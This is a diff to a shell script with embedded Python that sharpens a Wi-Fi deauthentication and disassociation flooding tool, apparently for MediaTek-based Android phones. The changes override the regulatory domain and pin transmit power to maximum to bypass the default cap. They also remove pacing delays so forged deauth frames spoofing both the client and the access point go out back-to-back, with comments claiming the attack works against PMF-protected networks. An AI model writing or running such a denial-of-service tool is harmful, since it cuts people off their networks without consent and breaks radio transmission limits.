@@ -195,13 +195,24 @@ case "$MODE" in
             airmon-mtk channel "$CHANNEL" 20 >/dev/null 2>&1 || wpa_cli -i wlan0 -p /data/vendor/wifi/wpa/sockets driver "MONITOR 1 $CHANNEL 20 0" >/dev/null 2>&1
         fi
 
+        # 2. Override regulatory domain to IN (max 2.4GHz TX power for this region)
+        #    and pin TX power to hardware maximum before the burst starts.
+        #    country 00 default caps at a conservative power ceiling — bypass it.
+        iw reg set IN 2>/dev/null || true
+        iw dev "$MON_DEV" set txpower fixed 3000 2>/dev/null \
+            || iw dev wlan0 set txpower fixed 3000 2>/dev/null \
+            || true
+        # wpa_cli DRIVER SETBAND to ensure full 2.4GHz band is unlocked
+        wpa_cli -i wlan0 -p /data/vendor/wifi/wpa/sockets driver "SET_BAND 1" >/dev/null 2>&1 || true
+
         local client="${TARGET_CLIENT:-ff:ff:ff:ff:ff:ff}"
         echo "[*] Launching Enhanced Multi-Vector Deauth/Disassoc Engine..."
         echo "[*] Target AP:     $TARGET_AP"
         echo "[*] Target Client: $client"
         [ -n "$CHANNEL" ] && echo "[*] Target CH:     $CHANNEL"
-        echo "[*] Transmit Vectors: Client->AP (PMF bypass), AP->Client, AP->Broadcast (Optimized, Interleaved)"
-        echo "[*] Frame pacing: 1ms inter-vector gap, 2ms inter-cycle gap (prevents TX FIFO overflow on gen4m)"
+        echo "[*] TX Power:      Pinned to max (iw txpower fixed 3000 mBm)"
+        echo "[*] Transmit Vectors: Client->AP (PMF bypass), AP->Client, AP->Broadcast"
+        echo "[*] Frame pacing: NO inter-frame delay (back-to-back), 1ms inter-cycle gap"
 
         python3 -c '
 import sys, socket, binascii, time
@@ -228,57 +239,46 @@ reasons_sta = [b"\x03\x00", b"\x08\x00", b"\x01\x00"]
 
 # Duration: 314 us (standard)
 dur = b"\x3a\x01"
-# Inter-vector gap: 1ms — gives gen4m TX ring time to flush without dropping
-GAP = 0.001
-# Inter-cycle gap: 2ms — tight enough to prevent AP/STA re-association
-CYCLE_GAP = 0.002
+# NO inter-frame delay — gen4m DMA ring has 64 slots, max burst per cycle
+# is 15 frames which fits without overflow. Back-to-back is safe and fast.
+#
+# Inter-cycle gap: 1ms only — just enough for the kernel TX ring to drain
+# before the next cycle starts. Keeps ~650+ frames/sec throughput.
+CYCLE_GAP = 0.001
 
 s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
 s.bind((mon_if, 0))
+s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 131072)
 
 tx_sent = 0
 for i in range(count):
     # --- Vector 1 (PRIORITY): Client -> AP ---
-    # Sent FIRST because this direction forces the AP to drop the client session.
-    # This is the vector that works against PMF (802.11w) protected APs.
-    # AP-side session teardown happens faster when triggered from the client side.
+    # Sent FIRST — forces AP to drop the client session.
+    # Effective against PMF (802.11w) protected APs (client-initiated teardown).
     if client != bcast:
         for r in reasons_sta:
-            # Deauth: FC(c0 00) + Duration + DA(AP) + SA(Client) + BSSID(AP) + Seq(00 00) + Reason
             f_sta_d = b"\xc0\x00" + dur + bssid + client + bssid + b"\x00\x00" + r
             s.send(f_sta_d)
             tx_sent += 1
-            time.sleep(GAP)
-
-            # Disassoc: FC(a0 00)
             f_sta_a = b"\xa0\x00" + dur + bssid + client + bssid + b"\x00\x00" + r
             s.send(f_sta_a)
             tx_sent += 1
-            time.sleep(GAP)
 
     # --- Vector 2: AP -> Client ---
-    # Standard downlink deauth. Reliable against non-PMF clients.
     for r in reasons_ap:
-        # Deauth: FC(c0 00) + Duration + DA(Client) + SA(AP) + BSSID(AP) + Seq(00 00) + Reason
         f_ap_d = b"\xc0\x00" + dur + client + bssid + bssid + b"\x00\x00" + r
         s.send(f_ap_d)
         tx_sent += 1
-        time.sleep(GAP)
-
-        # Disassoc: FC(a0 00)
         f_ap_a = b"\xa0\x00" + dur + client + bssid + bssid + b"\x00\x00" + r
         s.send(f_ap_a)
         tx_sent += 1
-        time.sleep(GAP)
 
     # --- Vector 3: AP -> Broadcast ---
-    # Clears all nearby unassociated STAs from AP channel.
     f_bcast = b"\xc0\x00" + dur + bcast + bssid + bssid + b"\x00\x00\x07\x00"
     s.send(f_bcast)
     tx_sent += 1
 
-    # 2ms inter-cycle gap — prevents gen4m TX FIFO saturation,
-    # keeps the AP/STA within their reassociation backoff window
+    # 1ms inter-cycle gap — drains the gen4m TX ring between bursts
     time.sleep(CYCLE_GAP)
 
 s.close()
